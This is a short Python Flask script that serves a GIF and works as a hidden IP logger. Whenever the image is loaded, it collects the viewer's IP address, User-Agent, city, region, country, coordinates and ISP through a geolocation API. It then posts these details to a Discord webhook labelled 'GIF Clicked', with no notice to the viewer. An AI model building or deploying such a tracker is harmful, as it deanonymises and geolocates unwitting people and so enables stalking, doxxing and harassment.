from flask import Flask, request, send_file, redirect
import requests
import os

app = Flask(__name__)
WEBHOOK_URL = os.getenv('WEBHOOK_URL')

def get_location(ip):
    try:
        data = requests.get(f"https://ipapi.co/{ip}/json/").json()
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country_name", "Unknown")
        lat = data.get("latitude")
        lon = data.get("longitude")
        isp = data.get("org", "Unknown")
        location = f"{city}, {region}, {country}"
        coords = f"({lat}, {lon})" if lat and lon else "Unknown"
        return location, coords, isp
    except:
        return "Unknown", "Unknown", "Unknown"

@app.route('/togif.gif')
def track():
    # Get IP
    forwarded = request.headers.get('X-Forwarded-For')
    ip = forwarded.split(',')[0] if forwarded else request.remote_addr
    user = request.args.get('user', 'Unknown')
    ua = request.headers.get('User-Agent', 'Unknown')[:80]
    location, coords, isp = get_location(ip)

    # Log to Discord
    if WEBHOOK_URL:
        payload = {
            "content": f"**GIF Clicked**\n"
                       f"**User:** `{user}`\n"
                       f"**IP:** `{ip}`\n"
                       f"**Location:** {location}\n"
                       f"**Coords:** `{coords}`\n"
                       f"**ISP:** `{isp}`\n"
                       f"**Device:** `{ua}`..."
        }
        try:
            requests.post(WEBHOOK_URL, json=payload)
        except:
            pass

    # Show the GIF
    return send_file('togif.gif', mimetype='image/gif')

# Optional: redirect root
@app.route('/')
def home():
    return redirect("https://discord.gg/yourserver")

if __name__ == '__main__':
    app.run()

